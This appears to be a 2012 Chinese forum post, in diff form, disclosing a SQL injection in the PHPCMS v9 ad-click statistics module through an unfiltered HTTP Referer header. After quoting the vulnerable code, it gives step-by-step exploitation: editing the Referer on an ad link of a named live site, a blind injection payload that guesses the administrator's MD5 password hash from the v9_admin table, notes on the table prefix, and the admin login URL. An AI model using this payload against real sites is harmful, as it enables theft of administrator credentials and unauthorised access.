@@ -1,0 +1,24 @@
+[【待审核】] phpcms v9 广告统计处（header头referer）注入
+本帖最后由 whoami 于 2012-11-16 06:53 编辑 
+
+author:whoami@wh0ami.net
+
+文件：phpcms/modules/poster/index.php  
+
+poster_click()方法 第27或119行预览源代码打印关于
+1 $this->s_db->insert(array('siteid'=>$siteid, 'pid'=>$id, 'username'=>$username, 'area'=>$area, 'ip'=>$ip, 'referer'=>HTTP_REFERER, 'clicktime'=>SYS_TIME, 'type'=> 1)); 
+HTTP_REFERER 被定义于 /phpcms/base.php 文件第23行预览源代码打印关于
+1 define('HTTP_REFERER', isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');     //未作任何过滤 
+利用方法：
+去首页找一个广告链接
+eg：http://www.90sec.org/index.php?m=poster&;c=index&a=poster_click&sitespaceid=1&id=639
+改变header头部referer值提交
+
+注入sql构造例子：预览源代码打印关于
+1 90sec','1',(select password from v9_admin where userid =1 and left(password,8) = '377ad72f'))#         //根据页面返回是否正常猜字段值 
+32md5  小写字母a-f 0-9
+表名前缀默认v9_ ，如果不是 需要根据报错信息自行修改
+
+后台登陆地址: http://www.90sec.org/index.php?m=admin&;c=index&a=login
+
+上两张测试图 
